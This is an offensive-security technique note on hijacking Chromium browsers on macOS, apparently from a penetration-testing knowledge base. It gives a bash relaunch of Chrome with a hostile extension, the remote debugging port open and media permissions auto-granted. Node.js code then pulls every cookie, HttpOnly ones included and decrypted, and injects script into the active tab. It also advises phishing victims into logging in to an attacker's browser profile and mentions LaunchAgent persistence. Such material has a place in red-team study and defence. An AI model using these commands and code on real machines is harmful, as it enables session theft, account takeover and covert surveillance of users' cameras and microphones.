---
title: "macOS Chromium / DevTools Protocol Injection"
type: technique
tags: [macos, injection, credential-access, post-exploitation]
phase: post-exploitation
date_created: 2026-07-15
date_updated: 2026-07-15
sources: [hacktricks-macos]
---

## Chromium / DevTools Protocol injection

Every Chromium browser (Chrome, Edge, Brave, Arc, Vivaldi, Opera) shares the same command-line switches, preference files, and DevTools automation, so any GUI user can relaunch the browser with flags that run with the victim's session and entitlements. Relaunch without touching the bundle, and persist via a LaunchAgent so the tampered browser respawns (see [[macos-persistence]]):

```bash
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
  --user-data-dir=/tmp/hijack \
  --remote-debugging-port=9222 \
  --load-extension=/tmp/evilext \
  --disable-extensions-except=/tmp/evilext \
  --use-fake-ui-for-media-stream
```

Key switches: `--load-extension` auto-loads an unpacked extension that can request `debugger`/`webRequest`/`cookies` to strip CSP, downgrade HTTPS, or exfil session material at startup; `--remote-debugging-port`/`--remote-debugging-pipe` expose the Chrome DevTools Protocol (CDP); `--user-data-dir` redirects the whole profile (and is mandatory alongside remote debugging since Chrome 136, March 2025, which ignores the switch on the default profile to enforce App-Bound Encryption); `--use-fake-ui-for-media-stream` auto-grants camera/mic. Because CDP asks the running browser to decrypt, it defeats App-Bound Encryption that would block raw-file cookie theft:

```javascript
// attach with chrome-remote-interface / puppeteer to ws://127.0.0.1:9222
const CDP = require('chrome-remote-interface');
CDP(async (c) => {
  const {Network, Runtime} = c;
  console.log((await Network.getAllCookies()).cookies);   // HttpOnly + decrypted
  await Runtime.evaluate({expression: "document.cookie"});// arbitrary JS in active tab
});
```

Useful CDP verbs: `Network.getAllCookies`/`Storage.getCookies` (session theft), `Browser.grantPermissions`/`Emulation.setGeolocationOverride` (permission and location spoof), `Runtime.evaluate` (JS injection), `Fetch.enable`/`Network.*ExtraInfo` (live request interception, no disk artifacts). Since 136, spawn a fresh `--user-data-dir` profile and phish the victim to auth inside it, then harvest via CDP.
